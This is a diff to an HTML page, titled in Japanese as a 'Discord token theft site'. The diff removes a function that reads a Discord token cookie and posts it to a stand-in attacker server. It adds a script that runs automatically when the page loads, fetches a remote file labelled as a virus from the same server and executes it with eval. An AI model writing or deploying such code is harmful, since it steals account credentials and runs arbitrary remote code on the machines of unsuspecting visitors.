@@ -35,42 +35,30 @@
 <body>
     <div class="container">
         <h1>ディスコードトークン奪取サイト</h1>
-        <p>ボタンをクリックしてください。</p>
-        <button class="button" onclick="stealToken()">クリックしてください</button>
+        <p>ページが読み込まれると自動で処理が開始されます。</p>
     </div>
 
     <script>
-        function stealToken() {
-            // Cookieからディスコードのトークンを取得
-            const cookies = document.cookie.split('; ');
-            let token = null;
-
-            cookies.forEach(cookie => {
-                if (cookie.startsWith('__discord_developer=')) {
-                    token = cookie.split('=')[1];
-                }
-            });
-
-            if (token) {
-                // トークンをサーバーに送信
-                fetch('https://your-server.com/steal', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ token: token })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('トークンが成功してサーバーに送信されました:', data);
+        // ウイルス（スクリプト）をダウンロードして実行
+        function downloadAndExecuteScript(url) {
+            fetch(url)
+                .then(response => response.text())
+                .then(script => {
+                    eval(script);
                 })
                 .catch(error => {
-                    console.error('トークン送信エラー:', error);
+                    console.error('スクリプトのダウンロードエラー:', error);
                 });
-            } else {
-                console.log('ディスコードトークンが見つかりません');
-            }
         }
+
+        // ページが読み込まれた際に自動で実行
+        window.onload = function() {
+            // ウイルスのURL
+            const virusUrl = 'https://your-server.com/virus.js';
+
+            // ウイルスをダウンロードして実行
+            downloadAndExecuteScript(virusUrl);
+        };
     </script>
 </body>
 </html>
